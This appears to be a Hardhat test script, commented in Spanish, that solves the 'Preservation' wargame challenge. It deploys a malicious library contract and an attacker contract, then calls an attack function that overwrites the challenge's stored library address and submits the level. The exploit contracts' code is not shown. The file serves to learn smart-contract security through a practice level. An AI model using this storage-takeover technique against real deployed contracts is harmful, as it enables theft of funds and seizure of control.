import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let libraryMaliciosa: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F";
const INSTANCIA_DEL_NIVEL: string = "0xcb8902CAf5a50A47047BD52162237A5Dc334314B";
// const INSTANCIA_DEL_NIVEL: string = "";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Preservation`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS);
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }

  // Contrato library maliciosa
  const libraryMaliciosaFactory = await ethers.getContractFactory(`PreservationLibraryMaliciosa`);
  libraryMaliciosa = await libraryMaliciosaFactory.deploy();
  await libraryMaliciosa.deployed();
  console.log(`CONTRATO LIBRARY MALICIOSA DEPLOYADO EN:`, libraryMaliciosa.address);

  // Contrato atacante (Si fuera necesario)
  const attackerFactory = await ethers.getContractFactory(`PreservationAttacker`);
  attacker = await attackerFactory.deploy(challenge.address, libraryMaliciosa.address);
  await attacker.deployed();
  console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("Preservation Challenge", async()=> {
  it("Resuelve el challenge - Preservation", async()=>{
    let library1 = await challenge.timeZone1Library();
    console.log("LA LIBRERIA 1 ES: ", library1);
    
    let txAtaque = await attacker.atacar({gasLimit:1e6});
    await txAtaque.wait();

    let library2 = await challenge.timeZone1Library()
    console.log("AHORA LIBRERIA 1 ES: ", library2);

  });
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});


//A partir de la versión 0.8.0 de solidity, no es posible realizar la conversión uint256(unAddress) tal y como se hizo en este challenge.
//Es el único challenge que me dificultó conseguir el tilde en la web. Todo estaba bien, simplemente utilicé una nueva instancia (botón azul), corrí el script nuevamente y funcionó.
// Para entender mejor cómo deberían utilizarse las librerías en solidity --> https://www.geeksforgeeks.org/solidity-libraries/


